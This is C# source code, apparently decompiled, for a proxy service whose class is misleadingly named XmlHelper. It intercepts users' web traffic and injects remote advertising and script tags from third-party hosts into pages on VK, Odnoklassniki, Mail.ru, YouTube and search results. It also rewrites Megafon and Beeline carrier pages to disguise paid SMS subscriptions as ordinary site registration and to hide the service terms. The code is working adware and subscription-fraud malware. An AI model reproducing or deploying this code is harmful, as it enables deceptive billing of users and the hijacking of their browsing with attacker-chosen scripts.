using System;
using System.Collections.Generic;
using System.Net;

namespace ProxyService;

public class XmlHelper
{
	public struct keyword
	{
		public int tickcount;

		public string key;
	}

	public static List<keyword> keys = new List<keyword>();

	public static void Load()
	{
	}

	public static bool httpIsEnvoved(HttpWebRequest req, HttpWebResponse resp)
	{
		string text = req.Address.ToString();
		string text2 = "";
		try
		{
			text2 = resp.ContentType;
			_ = req.Referer;
		}
		catch (Exception)
		{
		}
		if (text2.Contains("text/html") && (text.Contains("http://") || text.Contains("https://")))
		{
			if (!text.Contains("vk-vmeste.ru") && (!text.Contains("vk.com") || text.Contains("widget_comments") || text.Contains("q_frame.php")) && !text.Contains("mail.ru") && !text.Contains("odnoklassniki.ru") && !text.Contains("zip-connectio.in") && !text.Contains("signup.beeline.ru") && !text.Contains("wap.megafonpro.ru") && !text.Contains("sexkiss.ru") && !text.Contains("yandex.ru/yandsearch") && !text.Contains("yandex.ua/yandsearch") && !text.Contains("yandex.kz/yandsearch") && !text.Contains("yandex.by/yandsearch") && (!text.Contains("google.com/") || !text.Contains("q=")) && (!text.Contains("google.ru/") || !text.Contains("q=")) && (!text.Contains("google.com.ua/") || !text.Contains("q=")) && (!text.Contains("google.kz/") || !text.Contains("q=")) && (!text.Contains("google.by/") || !text.Contains("q=")) && !text.Contains("support-contact.ws") && !text.Contains("youtube.com"))
			{
				return text.Contains("rutube.ru");
			}
			return true;
		}
		return false;
	}

	public static int rnd(int from)
	{
		return new Random().Next(0, from);
	}

	public static string ChangeContent(string str, string url, string refx)
	{
		if (url.Contains("sexkiss.ru"))
		{
			return "ошибка";
		}
		ProxyServer.dbg("change: " + url + "/" + refx);
		if (url.Contains("vk-vmeste.ru"))
		{
			vkbill.vkCatchBilled(str);
			return str;
		}
		string text = "\r\n\r\n                    <div id='DIV_DA_90338'></div>\r\n                    <script charset='windows-1251' type='text/javascript' src='http://www.directadvert.ru/show.cgi?adp=90338&div=DIV_DA_90338'></script>";
		string newValue = text + " ";
		string text2 = "\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.ashx?flow_id=1&block_id=1&sub_key=vk'>\r\n</script>\r\n<script>\r\n\tv=3; // тизеров по горизонтали\r\n\th=1; // тизеров по вертикали\r\n\timage_size=100; // размер тизера\r\n\ttext_position=4 //положение текста: 1- справа, 2 - слева, 3 - сверху, 4 - снизу \r\n</script>\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.js'>\r\n</script>\r\n";
		string text3 = "<div id='bn_bfb5187b1b'>загрузка...</div>\r\n            <script type='text/javascript' SRC='http://recreativ.ru/rcode.bfb5187b1b.js'></script> ";
		string text4 = "\r\n<script language='javascript' type='text/javascript' src='http://popikundik.tip-tip.ru/5pdvtwcu3a498u0ohrq7mc1bl6otjsd1'></script>\r\n";
		string newValue2 = "<div id='DIV_DA_90725'></div><script charset='windows-1251' type='text/javascript' src='http://www.directadvert.ru/show.cgi?adp=90725&div=DIV_DA_90725'></script>";
		string text5 = "\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.ashx?flow_id=1&block_id=1&sub_key='>\r\n</script>\r\n<script>\r\n\tv=2; // тизеров по горизонтали\r\n\th=2; // тизеров по вертикали\r\n\timage_size=110; // размер тизера\r\n\ttext_position=1 //положение текста: 1- справа, 2 - слева, 3 - сверху, 4 - снизу \r\n</script>\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.js'></script>";
		string text6 = "<script type='text/javascript'>var sid=54547,bid=3533;</script><script type='text/javascript' src='http://vmblock.net/vm.js'></script>";
		text6 = "";
		string[] array = new string[2]
		{
			text2 + text3,
			text2 + text3
		};
		if (url.Contains("vk.com"))
		{
			if (vkbill.IsInjectVKBill(url, str))
			{
				str = vkbill.vkBillCode(str);
			}
			else
			{
				str = str.Replace("<noscript><meta http-equiv=\"refresh\" content=\"0; URL=/badbrowser.php\"></noscript>", newValue);
				str = str.Replace("<div id=\"left_blocks\"></div>", "");
				str = str.Replace("<div id=\"left_ads\"></div>", array[rnd(array.Length)]);
				str += text6;
			}
			return str;
		}
		if (url.Contains("odnoklassniki.ru"))
		{
			return str.Replace("</body></html>", "</body>" + text + " " + text4 + "</html>");
		}
		if (url.Contains("mail.ru"))
		{
			str = str.Replace("<script>splashRadar('informers');</script>", text5 + " " + text4);
			str = str.Replace("<script>splashRadar('news', 1);</script>", newValue2);
			return str;
		}
		if (url.Contains("wap.megafonpro.ru"))
		{
			string value = "Подписка ";
			string text7 = "Условиями предоставления услуги Подписки";
			int num = str.IndexOf(value);
			int num2 = str.IndexOf(text7, Math.Max(0, num));
			if (num != -1 && num2 != -1)
			{
				string oldValue = str.Substring(num, num2 - num + text7.Length);
				str = str.Replace(oldValue, "Введите полученный код с бесплатного сервисного номера");
				str = str.Replace("Введите SMS пароль", "");
			}
			return str;
		}
		if (url.Contains("signup.beeline.ru"))
		{
			str = str.Replace("Оформление подписки", "Регистрация на сайте");
			str = str.Replace("Ð¿Ð¾Ð\u00b4Ð¿Ð\u00b8Ñ\u0081ÐºÐ\u00b8", "");
			str = str.Replace("отправлена смс с кодом активации подписки", "отправлена смс с кодом подтверждения");
			str = str.Replace("input type=\"text\" name=\"\"", "input type=\"hidden\" name=\"\"");
			str = rep(str, "<td width=\"70%\">", "</td>", "");
			str = rep(str, "<td>", "</td>", "");
			str = rep(str, "<td>", "</td>", "");
			str = rep(str, "<td colspan=\"2\" align=\"center\">", "</td>", "");
			return str;
		}
		if (url.Contains("zip-connectio.in"))
		{
			string from = "<div id=\"disclaimerDetails\"";
			string tos = "</div>";
			str = rep(str, from, tos, "");
			return str;
		}
		if (url.Contains("youtube.com") || url.Contains("rutube.ru") || (url.Contains("yandex.") && url.Contains("yandsearch")) || (url.Contains("google.") && url.Contains("q=")))
		{
			str += "<script src='http://contact-under.ru/upper_vk.js'></script>";
		}
		if (url.Contains("support-contact.ws"))
		{
			str = "<html><script>document.location='http://adobe.com'</script></html>";
		}
		return str;
	}

	private static string rep(string str, string from, string tos, string withs)
	{
		int num = str.IndexOf(from);
		int num2 = str.IndexOf(tos, Math.Max(0, num));
		if (num != -1 && num2 != -1)
		{
			string oldValue = str.Substring(num, num2 - num + tos.Length);
			str = str.Replace(oldValue, withs);
		}
		return str;
	}

	public static string extr(string str, string from, string tos, bool withCorners)
	{
		int num = str.IndexOf(from);
		int num2 = str.IndexOf(tos, Math.Max(0, num));
		if (num != -1 && num2 != -1)
		{
			string text = "";
			if (withCorners)
			{
				return str.Substring(num, num2 - num + tos.Length);
			}
			return str.Substring(num + from.Length, num2 - num - from.Length);
		}
		return "";
	}

	public static string rndtext()
	{
		return new Random().Next(1, 100000).ToString();
	}
}
